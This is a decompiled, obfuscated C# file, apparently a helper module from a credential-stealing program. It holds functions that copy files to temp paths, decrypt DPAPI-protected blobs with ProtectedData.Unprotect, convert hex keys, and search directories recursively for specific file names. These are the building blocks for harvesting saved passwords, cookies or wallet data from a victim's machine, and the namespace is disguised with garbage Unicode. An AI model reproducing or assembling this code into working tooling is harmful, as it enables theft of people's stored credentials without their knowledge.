using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x0200005C RID: 92
	public static class Class_69
	{
		// Token: 0x060001AC RID: 428 RVA: 0x0000E910 File Offset: 0x0000CB10
		public static string CreateTempCopy(string filePath)
		{
			string text = Class_69.CreateTempPath();
			File.Copy(filePath, text, true);
			return text;
		}

		// Token: 0x060001AD RID: 429 RVA: 0x0000E934 File Offset: 0x0000CB34
		public static string CreateTempPath()
		{
			return Path.Combine(Class_47.\u0357\u0326\u032C\u034D\u0E47\u0020\u0332\u031F\u0E47\u0317\u035A\u031C\u0E47\u0329\u0020\u0345fiwgjkytcdevvkdu\u0320\u0332\u0020\u0320\u0349\u0340\u035F\u034D\u0E47\u034D\u0366\u0309\u0366\u0315\u034C\u031Dycedrxvdqukmrguc, "tmp" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode().ToString() + Thread.CurrentThread.ManagedThreadId.ToString());
		}

		// Token: 0x060001AE RID: 430 RVA: 0x0000E99B File Offset: 0x0000CB9B
		public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			return Encoding.UTF8.GetString(Class_69.DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy));
		}

		// Token: 0x060001AF RID: 431 RVA: 0x0000E9C0 File Offset: 0x0000CBC0
		public static byte[] DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			byte[] result;
			try
			{
				if (EncryptedData == null || EncryptedData.Length == 0)
				{
					result = null;
				}
				else
				{
					result = ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = null;
			}
			return result;
		}

		// Token: 0x060001B0 RID: 432 RVA: 0x0000EA14 File Offset: 0x0000CC14
		public static byte[] ConvertHexStringToByteArray(string hexString)
		{
			if (hexString.Length % 2 != 0)
			{
				throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", hexString));
			}
			byte[] array = new byte[hexString.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = hexString.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}

		// Token: 0x060001B1 RID: 433 RVA: 0x0000EA8C File Offset: 0x0000CC8C
		public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
		{
			List<string> list = new List<string>();
			if (files != null && files.Length != 0 && level <= maxLevel)
			{
				try
				{
					foreach (string path in Directory.GetDirectories(baseDirectory))
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							FileInfo[] files2 = directoryInfo.GetFiles();
							bool flag = false;
							int num = 0;
							while (num < files2.Length && !flag)
							{
								int num2 = 0;
								while (num2 < files.Length && !flag)
								{
									string a = files[num2];
									FileInfo fileInfo = files2[num];
									string name = fileInfo.Name;
									if (a == name)
									{
										flag = true;
										list.Add(fileInfo.FullName);
									}
									num2++;
								}
								num++;
							}
							foreach (string item in Class_69.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
							{
								if (!list.Contains(item))
								{
									list.Add(item);
								}
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				return list;
			}
			return list;
		}
	}
}
